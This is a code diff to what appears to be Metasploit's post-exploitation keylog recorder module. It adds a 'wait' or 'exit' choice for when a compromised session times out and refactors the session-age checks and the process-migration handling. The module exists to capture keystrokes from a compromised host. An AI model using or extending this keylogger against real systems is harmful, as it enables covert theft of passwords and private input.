@@ -44,7 +44,8 @@ class MetasploitModule < Msf::Post
     register_advanced_options(
       [
         OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false]),
-        OptInt.new( 'KeylogTimeOut',     [true, 'Time to close keylog recorder on stale session in seconds (150 to 900)', 300])
+        OptEnum.new('TimeOutAction', [true, 'Action to take when Session Communication Timeout occurs.',
+                'wait', ['wait','exit']])
       ], self.class)
   end
 
@@ -53,9 +54,9 @@ class MetasploitModule < Msf::Post
     print_status("Executing module against #{sysinfo['Computer']}")
     if datastore['MIGRATE']
       if datastore['CAPTURE_TYPE'] == "pid"
-        if  !migrate_pid(datastore['PID'], session.sys.process.getpid)
+        if !migrate_pid(datastore['PID'], session.sys.process.getpid)
           print_error("Unable to migrate to given PID. Using Explorer instead.")
-          process_migrate
+          return unless process_migrate
         end
       else
         return unless process_migrate
@@ -74,6 +75,7 @@ class MetasploitModule < Msf::Post
   def setup
     @logfile = nil
     @timed_out = false
+    @timed_out_age = nil  # Session age when it timed out
 
     @interval = datastore['INTERVAL'].to_i
     if @interval < 1
@@ -81,11 +83,7 @@ class MetasploitModule < Msf::Post
       @interval = 5
     end
 
-    @timeout = datastore['KeylogTimeOut'].to_i
-    if @timeout < 150 || @timeout > 900
-      print_error("KeylogTimeOut value out of bounds. Setting to 300.")
-      @timeout = 300
-    end
+    @wait = datastore['TimeOutAction'] == "wait" ? true : false
   end
 
   # This function sets the log file and loot entry.
@@ -252,22 +250,40 @@ class MetasploitModule < Msf::Post
         if session_good?
           write_keylog_data
         else
-          print_status("Session: #{datastore['SESSION']} is stale or has been closed. Exiting keylog recorder.")
-          rec = 0
+          if !session.alive?
+            print_status("Session: #{datastore['SESSION']} has been closed. Exiting keylog recorder.")
+            rec = 0
+          end
         end
       rescue::Exception => e
         if e.class.to_s == "Rex::TimeoutError"
-          print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
+          @timed_out_age = get_session_age
           @timed_out = true
+
+          if @wait
+            print_status("Timed out, but waiting.")
+          else
+            print_status("Session: #{datastore['SESSION']} is not responding. Exiting keylog recorder.")
+            rec = 0
+          end          
         elsif e.class.to_s == "Interrupt"
           print_status("User interrupt. Exiting keylog recorder.")
+          rec = 0
         else
           print_error("Keylog recorder encountered error: #{e.class} (#{e}) Exiting...")
           @timed_out = true
+          rec = 0
         end
-        rec = 0
       end
     end
+  end
+
+  # This function returns the number of seconds since the last time
+  # that the session checked in.
+  #
+  # @return [Integer Class] Number of seconds since last checkin
+  def get_session_age
+    return Time.now.to_i - session.last_checkin.to_i
   end
 
   # This function makes sure a session is still alive acording to the Framework.
@@ -278,9 +294,10 @@ class MetasploitModule < Msf::Post
   # @return [FalseClass] Session is dead or deamed stale
   def session_good?
     return false if !session.alive?
-    session_age = Time.now.to_i - session.last_checkin.to_i
-    return false if session_age >= @timeout
-    return false if @timed_out
+    if @timed_out
+      @timed_out = false if get_session_age < @timed_out_age && @wait  #reset timed out to false if module set to wait and session becomes active again.
+      return !@timed_out
+    end
     return true
   end
 
@@ -292,18 +309,17 @@ class MetasploitModule < Msf::Post
   # @return [TrueClass] Session is still responding
   # @return [FalseClass] Session has not responded during the set timeframe (30 seconds)
   def going_stale?
-    session_age1 = Time.now.to_i - session.last_checkin.to_i
+    session_age1 = get_session_age
     sleep(10)
-    session_age2 = Time.now.to_i - session.last_checkin.to_i
+    session_age2 = get_session_age
 
     if session_age2 > session_age1
       sleep(10)
-      session_age3 = Time.now.to_i - session.last_checkin.to_i
+      session_age3 = get_session_age
       if session_age3 > session_age2
         print_status("Session #{datastore['SESSION']} is likely going stale. Stand by...")
         sleep(10)
-        session_age4 = Time.now.to_i - session.last_checkin.to_i
-        return true if session_age4 > session_age3
+        return true if get_session_age > session_age3
       end
     end
     return false
